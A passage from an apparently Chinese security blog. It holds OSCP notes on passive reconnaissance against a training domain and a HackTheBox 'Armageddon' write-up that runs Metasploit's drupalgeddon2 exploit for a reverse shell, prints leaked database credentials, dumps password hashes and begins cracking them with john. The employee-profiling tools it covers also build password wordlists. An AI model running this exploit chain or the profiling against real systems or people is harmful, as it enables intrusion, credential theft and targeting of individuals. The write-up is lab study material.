字样的页面。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf5870d4-f165-484a-bd0f-d2a89291218c/Untitled.png)\n\n输出指的是目录列表页，列出了没有索引页的目录的文件内容。像这样的错误配置会暴露出有趣的文件和敏感信息。\n\n这些基本的例子只触及我们可以用搜索操作符做的事情的表面，谷歌黑客数据库（GHDB）包含了大量的创意搜索，展示了使用组合运算符进行创意搜索的力量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab846c69-da24-4d8b-a6cd-9e10df1d28c6/Untitled.png)\n\n掌握这些操作者，再加上敏锐的推理能力，是有效的搜索引擎“黑客”的关键技能。\n\n### 练习\n\n1. 谁是 MegaCorp One 的法律副总裁，他们的电子邮件地址是什么？\n2. 使用 Google dorks（你自己的或 GHDB 的任何一个）来搜索 [www.megacorpone.com](http://www.megacorpone.com)，寻找有趣的文件。\n3. 你还能确定哪些 MegaCorp One 的员工没有被列入 [www.megacorpone.com](http://www.megacorpone.com)？\n\n## Netcraft\n\nNetcraft 是一家位于英国的互联网服务公司，提供一个免费的门户网站，执行各种信息收集功能。使用诸如 Netcraft 所提供的服务被认为是一种被动的技术，因为我们从不与目标直接互动。\n\n让我们回顾一下 Netcraft 的一些功。例如，我们可以使用 Netcraft 的 DNS 搜索页面（https://searchdns.netcraft.com）来收集关于 [megacorpone.com](http://megacorpone.com) 域名的信息。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b34d74e8-7ab7-4ec1-8598-057eec3f6726/Untitled.png)\n\n对于发现的每个服务器，我们可以通过点击每个网站 URL 旁边的图标，查看“网站报告”，提供有关该服务器的额外信息和历史。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14b4a1ca-02f0-4381-91bc-4f26f35c1a90/Untitled.png)\n\n报告的开头涉及注册信息。然而，如果我们向下滚动，我们发现各种“网站技术”条目。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4bb9214-020c-492a-8cfe-58760f31ee15/Untitled.png)\n\n这份子域和技术的清单将在我们转向积极的信息收集和利用时证明是有用的。现在，我们将把他添加到我们的笔记中。\n\n### 练习\n\n1. 使用Netcraft来确定在 [www.megacorpone.com](http://www.megacorpone.com/) 上运行的是什么应用服务器。\n\n## Recon-ng\n\nRecon-ng 是一个基于模块的框架，用于基于网络的信息收集。recon-ng 讲一个模块的结果显示在终端上，但它也将这些结果存储在数据库中。recon-ng 的大部分功能在于将一个模块的结果输入另一个模块，使我们能够迅速扩大信息收集的范围。\n\n让我们用 recon-ng 来汇编关于 MegaCorp One 的有趣数据。为了开始，让我们简单的运行 recon-ng。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# recon-ng \n[*] Version check disabled.\n\n    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/\n   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/       \n  _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/\n _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ \n_/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/    \n\n                                          /\\\\\n                                         / \\\\\\\\ /\\\\\n    Sponsored by...               /\\\\  /\\\\/  \\\\\\\\V  \\\\/\\\\\n                                 / \\\\\\\\/ // \\\\\\\\\\\\\\\\\\\\ \\\\\\\\ \\\\/\\\\\n                                // // BLACK HILLS \\\\/ \\\\\\\\\n                               www.blackhillsinfosec.com\n\n                  ____   ____   ____   ____ _____ _  ____   ____  ____\n                 |____] | ___/ |____| |       |   | |____  |____ |\n                 |      |   \\\\_ |    | |____   |   |  ____| |____ |____\n                                   www.practisec.com\n\n                      [recon-ng v5.1.1, Tim Tomes (@lanmaster53)]                       \n\n[*] No modules enabled/installed.\n\n[recon-ng][default] >\n```\n\n根据输出结果，我们需要安装各种模块来使用 recon-ng。\n\n我们可以从 recon-ng “Marketplace” 中添加模块，我们将用 marketplace search 从提示中搜索市场，提供一个搜索字符串作为参数。\n\n在这个例子中，我们将搜索包含 github 这个词的模块：\n\n```bash\n[recon-ng][default] > marketplace search github\n[*] Searching module index for 'github'...\n\n  +------------------------------------------------------------------------------------------------+\n  |                       Path                      | Version |     Status    |  Updated   | D | K |\n  +------------------------------------------------------------------------------------------------+\n  | recon/companies-multi/github_miner              | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/profiles-contacts/github_users            | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/profiles-profiles/profiler                | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/profiles-repositories/github_repos        | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/repositories-profiles/github_commits      | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/repositories-vulnerabilities/github_dorks | 1.0     | not installed | 2019-06-24 |   | * |\n  +------------------------------------------------------------------------------------------------+\n\n  D = Has dependencies. See info for details.\n  K = Requires keys. See info for details.\n```\n\n请注意，一些模块在 “K” 列中标有星号。这些模块需要第三方供应商的凭证或 API 秘钥。recon-ng wiki 维护着一份其模块所使用的秘钥的简短列表。其中一些秘钥可用于免费账户，而另一些则需要订阅。\n\n我们可以通过使用模块名称后面的市场信息来了解更多关于一个模块的信息。由于 GitHub 模块需要 API 秘钥，让我们用这个命令来检查 recon/domains-hosts/google_site_web 模块。\n\n```bash\n[recon-ng][default] > marketplace info recon/domains-hosts/google_site_web\n\n  +---------------------------------------------------------------------------------------------------------------------------------+\n  | path          | recon/domains-hosts/google_site_web                                                                             |\n  | name          | Google Hostname Enumerator                                                                                      |\n  | author        | Tim Tomes (@lanmaster53)                                                                                        |\n  | version       | 1.0                                                                                                             |\n  | last_updated  | 2019-06-24                                                                                                      |\n  | description   | Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                                                              |\n  | dependencies  | []                                                                                                              |\n  | files         | []                                                                                                              |\n  | status        | not installed                                                                                                   |\n  +---------------------------------------------------------------------------------------------------------------------------------+\n```\n\n根据它的描述，这个模块用 “site” 操作符搜搜谷歌，它不需要 API 秘钥。让我们用 marketplace install 来安装这个模块。\n\n```bash\n[recon-ng][default] > marketplace install recon/domains-hosts/google_site_web\n[*] Module installed: recon/domains-hosts/google_site_web\n[*] Reloading modules...\n```\n\n安装完模块后，我们可以用模块加载，后面跟上它的名字。然而，我们用 info 来显示模块的细节和所需参数。\n\n```bash\n[recon-ng][default] > modules load recon/domains-hosts/google_site_web\n[recon-ng][default][google_site_web] > info\n\n      Name: Google Hostname Enumerator\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with\n  the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n```\n\n注意，现在我们已经安装并加载了该模块，输出包含了关于该模块的额外信息。根据输出结果，该模块需要使用一个源，也就是我们向收集的信息的目标。\n\n在这种情况下，我们将使用选项 set SOURCE [megacorpone.com](http://megacorpone.com) 来设置我们的目标域。\n\n```bash\n[recon-ng][default][google_site_web] > options set SOURCE megacorpone.com\nSOURCE => megacorpone.com\n```\n\n最后，我们运行该模块\n\n```bash\n[recon-ng][default][google_site_web] > run\n---------------\nMEGACORPONE.COM\n---------------\n[*] Searching Google for: site:megacorpone.com\n[*] [host] www.megacorpone.com (<blank>)\n[*] [host] vpn.megacorpone.com (<blank>)\n[*] [host] www2.megacorpone.com (<blank>)\n[*] [host] siem.megacorpone.com (<blank>)\n[*] Searching Google for: site:megacorpone.com -site:www.megacorpone.com -\nsite:vpn.megacorpone.com -site:www2.megacorpone.com -site:siem.megacorpone.com\n-------\nSUMMARY\n-------\n[*] 4 total (4 new) hosts found.\n```\n\n这些结果反映了我们从 Netcraft DNS 搜索中发现的情况。然而，我们没有在这里浪费我们的时间。Recon-ng 将结果储存在本地数据库中，这些结果将反馈给其他 recon-ng 模块。\n\n我们可以使用 show hosts 命令来查看存储的数据。\n\n```bash\n[recon-ng][default][google_site_web] > back\n[recon-ng][default] > show\nShows various framework items\nUsage: show\n<companies|contacts|credentials|domains|hosts|leaks|locations|netblocks|ports|profiles\n|pushpins|repositories|vulnerabilities>\n\n[recon-ng][default] > show hosts\n+--------------------------------------------------------------------------------+\n| rowid |         host         | ip_address | region | country |      module     |\n+--------------------------------------------------------------------------------+\n| 1     | www.megacorpone.com  |            |        |         | google_site_web |\n| 2     | vpn.megacorpone.com  |            |        |         | google_site_web |\n| 3     | www2.megacorpone.com |            |        |         | google_site_web |\n| 4     | siem.megacorpone.com |            |        |         | google_site_web |\n+--------------------------------------------------------------------------------+\n[*] 4 rows returned\n[recon-ng][default] >\n```\n\n我们的数据库中有四个主机，但没有关于他们的额外信息。也许另一个模块可以填入 IP 地址。\n\n```bash\n[recon-ng][default] > marketplace info recon/hosts-hosts/resolve\n\n  +-------------------------------------------------------------------------------------------------+\n  | path          | recon/hosts-hosts/resolve                                                       |\n  | name          | Hostname Resolver                                                               |\n  | author        | Tim Tomes (@lanmaster53)                                                        |\n  | version       | 1.0                                                                             |\n  | last_updated  | 2019-06-24                                                                      |\n  | description   | Resolves the IP address for a host. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                              |\n  | dependencies  | []                                                                              |\n  | files         | []                                                                              |\n  | status        | not installed                                                                   |\n  +-------------------------------------------------------------------------------------------------+\n\n[recon-ng][default] >\n```\n\n该模块的描述符合我们的需要，所以我们将用 marketplace install 来安装它。\n\n```bash\n[recon-ng][default] > marketplace install recon/hosts-hosts/resolve\n[*] Module installed: recon/hosts-hosts/resolve\n[*] Reloading modules...\n```\n\n<aside> 💡 一个“无效命令”的错误可能表明我们处于错误的命令级别。如果发生这种情况，请返回运行，回到主 recon-ng 提示符，并再次尝试该命令。\n\n</aside>\n\n一旦模块安装完毕，我们可以用模块加载来使用它，并运行 info 来显示模块及其选项的信息。\n\n```bash\n[recon-ng][default] >  modules load recon/hosts-hosts/resolve\n[recon-ng][default][resolve] > info\n\n      Name: Hostname Resolver\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Resolves the IP address for a host. Updates the 'hosts' table with the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL AND ip_address IS NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n\nComments:\n  * Note: Nameserver must be in IP form.\n```\n\n从上面的输出可以看出，这个模块将为一个主机解析 IP 地址。我们需要提供我们想要解析的 IP 地址作为我们的来源。我们可以为来源设置四个选项：默认、字符串、路径和查询。每个选项旁边都有一个描述，如清单中所示。例如，在 “google_site_web” 重组模块中，我们使用了一个字符串。\n\n然而，这次我们想利用数据库。如果我们使用“默认”值，recon-ng 将在其数据库中为任何有主机名但没有 IP 地址的记录查找主机信息。\n\n如清单中所示，我们有四个没有 IP 地址的主机。如果我们选择一个“默认”来源，该模块将自动针对我们数据库中的所有四个主机运行。\n\n让我们试试这个方法，将我们的源设置为“默认”，然后运行该模块：\n\n```bash\n[recon-ng][default][resolve] > run\n[*] www.megacorpone.com => 38.100.193.76\n[*] vpn.megacorpone.com => 38.100.193.77\n[*] www2.megacorpone.com => 38.100.193.79\n[*] siem.megacorpone.com => 38.100.193.89\n```\n\n不错。我们现在有了这四个域名的 IP 地址。\n\n如果我们再次显示主机，我们可以验证数据库已经用两个模块的结果进行了更新。\n\n```bash\n[recon-ng][default][resolve] > show hosts\n\n  +-----------------------------------------------------------------------------------------------------------------+\n  | rowid |         host        |   ip_address  | region | country | latitude | longitude | notes |      module     |\n  +-----------------------------------------------------------------------------------------------------------------+\n  | 1     | www.megacorpone.com | 38.100.193.76 |        |         |          |           |       | google_site_web |\n  | 2     | www.megacorpone.com | 38.100.193.77 |        |         |          |           |       | google_site_web |\n  | 3     | www.megacorpone.com | 38.100.193.79 |        |         |          |           |       | google_site_web |\n  | 4     | www.megacorpone.com | 38.100.193.89 |        |         |          |           |       | google_site_web |\n  +-----------------------------------------------------------------------------------------------------------------+\n\n[*] 4 rows returned\n```\n\n### 练习\n\n1. 使用 recon/domains-hosts/google_site_web 和 recon/hosts-hosts/resolve 模块来收集 MegaCorp One 的信息。\n2. 花点时间探索其他侦查模块\n\n## 开源代码\n\n在下面的章节中，我们将讨论各种在线工具和资源，它们可以用来被动地搜索信息。其中一个有趣的信息来源是开源项目和在线代码库，如 GitHub、GitLab 和 SourceForge。\n\n在线存储的代码可以提供一个组织所使用的编程语言和框架的一瞥。在一些罕见的情况下，开发人员甚至以外地将平安数据和凭证提交到公共仓库。\n\n其中一些平台的搜索工具将支持我们在本模块前面讨论的谷歌搜索操作符。\n\n例如，GitHub 的搜索是非常灵活的。在 GitHub 上，我们可以搜索用户或组织的仓库，但如果我们想搜索所有公共仓库，就需要一个账户。在之前的模块中，我们确定了 MegaCorp One 的 GitHub 账号。\n\n让我们在该账户的仓库中搜索有趣的信息。我们可以使用 filename:users 来搜索名称中含有 “users” 的任何文件。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed59a055-9ec7-4ea0-8748-879f0137a615/Untitled.png)\n\n我们的搜索值发现一个文件 —— xampp.users。即使只有一个结果，我们也可能发现了非常有趣的东西，因为 XAMPP 是一个网络应用程序开发环境。让我们检查一下该文件的内容。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0701c9d9-9086-4d31-971e-cfd65489a990/Untitled.png)\n\n这个文件似乎包含了一个用户名和密码，在我们开始主动攻击阶段时可能非常有用。让我们把它添加到我们的笔记中。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbaded95-8349-4849-8371-4c9a7199ec3e/Untitled.png)\n\n这种手工方法在小型仓库中效果最好。对于较大的仓库，我们可以使用一些工具来帮助自动搜索，比如 Gitrob 和 Gitleaks.Recon-ng 也有一些模块用于搜索 GitHub。这些工具大多需要一个访问令牌来使用源代码托管商的 API。\n\n例如，下面的截图显示了 Gitleaks 在一个文件中找到 AWS 客户 ID 的例子。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41394529-1b80-42e7-80df-fac846e65fa0/Untitled.png)\n\n<aside> 💡 通过源代码搜索秘密的工具，如 Gitrob 或 Gitleaks，通常依靠正则表达式或基于熵的检测来识别潜在的有用信息。正则表达式是一种预定义的搜索模式，。它们对于在文本中搜索常用密码的变化特别有用。另一方面，基于熵的检测试图寻找随机生成的字符串。这里的想法是，一长串的随机字符和数字很可能是一个密码。无论一个工具如何搜索秘密，没有一个工具是完美的，它们会错过人工检查可能发现的东西。\n\n</aside>\n\n### 练习\n\n1. 搜索 [Megacopone.com](http://Megacopone.com) 的 GitHub 仓库，寻找有趣或敏感的信息。\n\n## Shodan\n\n在我们收集目标信息的过程中，重要的是要记住，传统的网站只是互联网的一个部分。\n\nShodan 是一个搜索引擎，它抓取连接到互联网的设备，包括但不限于万维网。这包括运行网站的服务器，也包括路由器和物联网设备等设备。\n\n换句话说，谷歌和其他搜索引擎寻找网络服务商的内容，而 Shodan 则搜索连接互联网的设备，与它们互动，并显示它们的信息。\n\n尽管完成本模块或实验中的任何材料都不需要使用 Shodan，但它值得我们去探索一下。在使用 Shodan 之前，我们必须注册一个免费账号，它提供有限的访问权限。\n\n让我们先用 Shodan 来搜索 hostname:megacorpone.com。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/963d235a-cdf8-4700-9571-5f6ab2c9667f/Untitled.png)\n\n在这种情况下，Shodan 列出了 IP、服务和 banner 信息。所有这些都是在不与客户的网站互动的情况下被动收集的。\n\n这些信息给了我们一个目标互联网足迹的快照。例如，有 8 台服务器在运行 SSH，我们可以通过点击顶级服务下的 SSH 来深入了解，以完善我们的结果。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7445302a-f974-47d0-ac43-ca5a3f68479e/Untitled.png)\n\n根据 Shodan 的结果，我们确切地知道每台服务器上运行的是哪个版本的 OpenSSH。如果我们点击一个 IP 地址，我们可以检索到该主机的摘要。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d86a8aac-398f-402d-b3ac-e5d30710bff2/Untitled.png)\n\n我们可以在这个页面上查看服务器使用的域名、服务和技术。Shodan 还将显示任何已确定的服务或技术是否有任何公开的漏洞。当我们决定从哪里开始主动测试时，这些信息是非常宝贵的。\n\n## 安全头文件扫描器\n\n还有一些其他的专业网站，我们可以用来收集有关网站或域名的安全态势的信息。其中一些网站模糊了被动和主动收集信息的界限，但对于我们的目的来说，关键的一点是，第三方正在发起任何扫描或检查。\n\n一个这样的网站，Security Headers，将分析 HTTP 响应头并提供目标网站的安全态势的基本分析。我们可以利用这一点，根据结果了解一个组织的编码和安全实践。\n\n让我们扫描 [www.megacorpone.com](http://www.megacorpone.com)，并检查结果\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd0db15a-d07f-41c4-854b-a8f1bd75dde2/Untitled.png)\n\n该网站缺少了几个防御性标头，如 Content-Security-Policy 和 X-Frame-Options。这些缺少的标头本身不一定是漏洞，但它们可能表明网站开发人员或服务器管理人员不熟悉服务器加固。\n\n<aside> 💡 服务器加固，或安全配置，是通过配置确保服务器安全的整体过程。这包括禁用不需要的服务，删除不使用的服务或用户账户，轮流使用默认密码，设置适当的服务器头文件等等。我们不需要知道配置每一种类型的服务器的所有内幕，但在分析服务器以确定如何最好地接近一个潜在的目标时，了解这些概念和想要寻找的东西可以帮助我们。\n\n</aside>\n\n## SSL 服务器测试\n\n我们可以使用的另一个扫描工具是 Qualys SSL Labs 的 SSL 服务器测试。这个工具可以分析服务器的 SSL/TLS 配置，并将其与当前的最佳做法进行比较。它还会识别一些与 SSL/TLS 相关的漏洞，如 Poodle 或 Hearbleed。让我们扫描 [www.megacorpone.com](http://www.megacorpone.com)，并检查结果。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31cad48b-1c5f-4574-9c6f-4addcdf3b9de/Untitled.png)\n\n其结果并不像安全头文件检查那样糟糕。然而，弱的 Diffie-Hellman 秘钥交换、RC4 密码器和缺乏 Forward Secrecy 表明我们的目标没有应用当前的 SSL/TLS 加固的最佳实践。例如，由于存在多个漏洞，禁用 RC4 密码器已经被推荐了好几年。我们可以利用这些发现来深入了解目标组织内的安全实践，或者说缺乏安全实践。\n\n## Pastebin\n\nPastebin 是一个存储和分享文本的网站。该网站的基本使用不需要一个账户。许多人使用 Pastebin，因为它无处不在，使用简单。但由于 Pastebin 是一个公共服务，我们可以用它来搜索敏感信息。\n\n例如，我们可以使用网站进行基本搜索，或使用 API 进行更高级的使用。让我们来搜索 [Mgeacorpone.com](http://Mgeacorpone.com)。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1958f1d-c37f-4b20-ab24-30d126722be2/Untitled.png)\n\n只有十个结果，但其中一些看起来非常熟悉。我们在这里可能找不到任何关于 MegaCorp One 的新信息，但在未来的信息收集工作中，我们不应该忽略搜索 Pastein。\n\n## 用户信息收集\n\n除了收集目标组织的资源信息外，我们还可以收集该组织员工的信息。我们收集这些信息的目的是为了编制用户或密码列表，为社会工程建立借口，加强网络钓鱼活动或客户端攻击，执行凭证填充等等。然而，每个渗透测试的参与规则都不同。一些渗透测试可能仅限于纯粹的技术测试，没有任何社会工程方面的内容。其他活动可能只有很少或没有限制。\n\n下面的一些方法将与前几节已经讨论过的方法重叠，但我们将深入探讨一些专门针对用户枚举的工具。\n\n当我们开始收集用户的信息时，我们确实需要谨慎行事。正如我们在本模块的介绍中提到的关于“大卫”的故事，我们的目标是改善客户的安全态势，而不一定要让任何一个人被解雇。同样的，我们也不想违反任何法律。一个公司只能授权针对他们自己的系统进行测试，员工的个人设备、第三方电子邮件和社交媒体账户通常不属于这个授权范围。\n\n### 收获电子邮件\n\n让我们从一些基本的电子邮件收集开始我们的用户信息收集。在这种情况下，我们将使用 Harvester，它从多个公共数据源收集电子邮件、姓名、子域、IP 和 URL。\n\n例如，我们可以运行 Harvester，用 `-d` 来指定目标域，用 `-b` 来设置搜索的数据源。\n\n```bash\nkali@kali:~$ theharvester -d megacorpone.com -b google\n...\n[-] Starting harvesting process for domain: megacorpone.com\n\n[-] Searching in Google:\n Searching 0 results...\n Searching 100 results...\n Searching 200 results...\n Searching 300 results...\n Searching 400 results...\n Searching 500 results...\n\nHarvesting results\nNo IP addresses found\n\n[+] Emails found:\n------------------\njoe@megacorpone.com\nmcarlow@megacorpone.com\nfirst@megacorpone.com\n\n[+] Hosts found in search engines:\n------------------------------------\n\nTotal hosts: 13\n\n[-] Resolving hostnames IPs...\n\nNs1.megacorpone.com:38.100.193.70\nSiem.megacorpone.com:38.100.193.89\nadmin.megacorpone.com:38.100.193.83\nbeta.megacorpone.com:38.100.193.88\nfs1.megacorpone.com:38.100.193.82\nintranet.megacorpone.com:38.100.193.87\nmail.megacorpone.com:38.100.193.84\nmail2.megacorpone.com:38.100.193.73\nns1.megacorpone.com:38.100.193.70\nns2.megacorpone.com:38.100.193.80\nurl.megacorpone.com:empty\nwww.megacorpone.com:38.100.193.76\nwww2.megacorpone.com:38.100.193.79\n```\n\n我们发现了一些电子邮件地址，其中一个 “first@megacorpone.com” 对我们来说似乎是新的。[我们还发现了megacorpone.com](http://xn--megacorpone-ix9qn5bh73bnn4ci66c899e.com) 的一些新子域。让我们把这些也添加到我们的笔记中。\n\n这是一个很好的提醒，信息收集并不总是一个整齐的、线性的过。我们可能正在寻找用户的信息时，发现了关于我们目标的其他信息。这就是保持良好的笔记的一个原因。\n\n### 密码转储\n\n恶意黑客经常在 Pastebin 或其他信誉较差的网站上转储被破解的凭证。这些密码转储对于生成词表来说是非常有价值的。例如，Kali Linux 包括从 2009 年的数据泄露事件中产生的 “rockyou” 字样。\n\n## 社会媒体工具\n\n几乎所有的组织现在都在社会媒体上保持着某种存在。在公司发布的信息对我们来说非常有用。例如，我们可以利用这些信息来识别潜在的员工，并获得更多关于公司及其运作的信息。有各种方法可以通过我们已经讨论过的几个工具来收集这些公共信息，例如 recon-ng 和 theHarvester。让我们来探讨一下另外几个工具。\n\n### Social-Searcher\n\nSocial-Searcher 是一个社交媒体网站的搜索引擎。一个免费的账户将允许每天有限的搜索次数。Social-Searcher 可以成为在多个更专业的服务上设置 API 秘钥的一个快速替代方案。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9203d2aa-8883-4c67-9f49-7566ef446b98/Untitled.png)\n\n搜索结果将包括目标组织发布的信息以及人们对其的评价。除其他事项外，这可以帮助我们确定一个组织在社交媒体上有什么样的足迹和覆盖面。一旦我们完成了这些，我们可能会选择继续使用特定地点的工具。\n\n### 特定地点的工具\n\n有两个特定网站的工具，我们可能想熟悉一下。\n\nTwofi 扫描用户的 Twitter 信息，并生成一个个性化的单词表，用于对该用户的密码攻击。虽然我们不会在被动的信息收集过程中进行任何攻击，但我们可以针对我们已经确定的任何 Twitter 账户运行这个工具，以便在需要时准备好一个词表。Twofi 需要一个有效的 Twitter API 秘钥。\n\nlinkedin2username 是一个基于 LinkedIn 数据生成用户名列表的脚本。它需要有效的 LinkedIn 凭证，并依赖于与目标组织中的个人的 LinkedIn 连接。该脚本将输出几种不同格式的用户名。\n\n## Stack Overflow\n\nStack Overflow 是一个供开发人员提出和回答编码相关问题的网站。\n\n从信息收集的角度来看，该网站的价值在于观察一个特定的用户所提出或回答的问题的类型。如果我们能合理地确定 Stack Overflow 上的用户也是我们目标组织的员工，我们就能根据该员工的问题和回答推断出该组织的一些情况。\n\n例如，如果我们发现一个用户总是在询问和回答关于 Python 的问题，那么我们就有理由认为他们每天都在使用这种编程语言，而且很可能是他们所在的组织中使用。\n\n更糟糕的是，如果我们发现员工在这些类型的论坛上讨论敏感信息，如漏洞修复，我们可能在这个阶段发现未修补的漏洞。\n\n## 信息收集框架\n\n在本模块的最后，我们将简要地提到两个额外的工具，它们融合了我们讨论过的许多技术，并增加了额外的功能。这些工具对于我们将在实验室中进行的工作来说通常过于沉重，但在现实世界的评估中它们是有价值的。\n\n### OSINT 框架\n\nOSINT 框架包括在一个中心位置的信息收集工具和网站。该框架中所列的一些工具涵盖了比信息安全更多的学科。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d053c2e2-b86c-4e29-8aa5-3fa0e8eaa565/Untitled.png)\n\nOSINT 框架并不意味着是一个检查清单，但审查这些类别和可用的工具可能会激发对额外信息收集机会的想法。\n\n### Maltego\n\nMaltego 是一个非常强大的数据挖掘工具，它提供了无尽的搜索工具和策略组合。它的学习曲线可能很陡峭，坦率地说，它对这个模块来说是多余的，但其令人印象深刻的能力值得介绍一下。\n\nMaltego 搜索数以千计的在线数据源，并使用极其巧妙的“转换”来将一个信息转换为另一个信息。例如，如果我们正在进行一个用户信息收集活动，我们可以提交一个电子邮件地址，并通过各种自动搜索，将其“转化”为一个相关的电话号码或街道地址。在一次组织信息收集活动中，我们可以提交一个域名，将其“转化”为一个网络服务器，然后是电子邮件地址列表，然后是相关的社交媒体账户列表，然后是该电子邮件账户的潜在密码列表。\n\n组合是无穷无尽的，而且发现的信息以可扩展的图表形式呈现，允许轻松的缩放导航。\n\nMaltego CE（Maltego 有限的“社区版本”）包含在 Kali 中，需要免费注册才能使用。商业版本也有，可以处理更大的数据集。\n\n多个供应商提供的信息，Maltego 可以摄取和显示。然而，一些供应商也对其数据的访问进行收费。Maltego 不需要完成实验室中的任何材料，但它可以成为大型信息收集行动中不可缺少的工具。\n","tags":["OSCP"],"categories":["OSCP"]},{"title":"Armageddon - Hackthebox","url":"/2022/08/04/Hackthebox/Easy/Hackthebox-Armageddon/","content":"\n# 靶场信息\n\n![](Hackthebox-Armageddon/image1.png)\n\n# 靶场类型\n\n![](Hackthebox-Armageddon/image2.png)\n\n# 信息搜集\n\n## NMAP\n\n首先使用 nmap 进行扫描\n\n```\nnmap –A -sS –sC –Sv 10.10.10.233\n```\n\n![](Hackthebox-Armageddon/image3.png)\n\n我们可以看到开启了22和80端口\n\n在 80 端口提示了我们存在 robots.txt 文件，并且东西很多 咱们访问一下\n\n![](Hackthebox-Armageddon/image4.png)\n\n其中引起我兴趣的东西呢就是 `/MAINTAINERS.txt` 文件了\n\n这是维护文件，或者说是升级文件，咱们打开看一下\n\n![](Hackthebox-Armageddon/image5.png)\n\n果不其然，里面揭露了`Drupal`的版本\n\n到这里思路就明了了\n\n# 漏洞利用\n\n咱们直接使用 msf 进行 getshell\n\n使用 msfconsole 打开 msf\n\n输入`search drupal`搜索可用的exp\n\n![](Hackthebox-Armageddon/image6.png)\n\n咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了\n\n咱们把目光放在 `2018-03-28的exp` 上\n\n```\nuse exploit/unix/webapp/drupal_drupalgeddon2\n\noption\n\nset RHOSTS 10.10.10.233\n\nset lhost 10.10.14.135\n\nexploit\n```\n\n![](Hackthebox-Armageddon/image7.png)\n\n成功获取到一个shell\n\n![](Hackthebox-Armageddon/image8.png)\n\n咱们运行一下无法查看到uid，但是可以查看到文件\n\n但我偏不，我就想知道当前用户怎么办？\n\n简单\n\n输入 shell\n\n![](Hackthebox-Armageddon/image9.png)\n\n一开始我以为是卡住了，但后来想想不对，好像是获取到了\n\n![](Hackthebox-Armageddon/image10.png)\n\n执行命令后确认命令是可以被执行的？\n\n那咱们先想办法获得一个稳定的shell吧\n\n```\n/bin/bash –i\n```\n\n![](Hackthebox-Armageddon/image11.png)\n\n不一样被我搞到shell了，可给我NB坏了，叉会儿腰\n\n![](Hackthebox-Armageddon/image12.png)\n\n用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限\n\n我在查看源码和配置文件的时候，在 ../sites/default/settings.php 中找到了数据库的账号密码\n\n![](Hackthebox-Armageddon/image13.png)\n\n```\ndatabase => drupal\n\nusername => drupaluser\n\npassword => CQHEy@9M*m23gBVj\n```\n\n他不是开启了22端口吗，咱们直接ssh登录吧\n\n![](Hackthebox-Armageddon/image14.png)\n\n嗯？密码不对？啊这，就有点尴尬了呀\n\n没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补\n\n在咱们的 shell 里直接使用 mysql 进行登录\n\n![](Hackthebox-Armageddon/image15.png)\n\n很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西\n\n![](Hackthebox-Armageddon/image16.png)\n\n经过多方测试以及查找资料后，得出正确的查询命令\n\n```\nmysql -u \"drupaluser\" -h \"localhost\" \"-pCQHEy@9M*m23gBVj\" \"drupal\" -e \"select uid, name, pass from users;\"\n```\n\n![](Hackthebox-Armageddon/image17.png)\n\nbrucetherealadmin 账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！\n\n将用户 brucetherealadmin 的 hash 保存为一个文本文件\n\n![](Hackthebox-Armageddon/image18.png)\n\n请出我们的神器john\n\n```\njohn --wordlist=/usr/share/wordlists/rockyou.txt 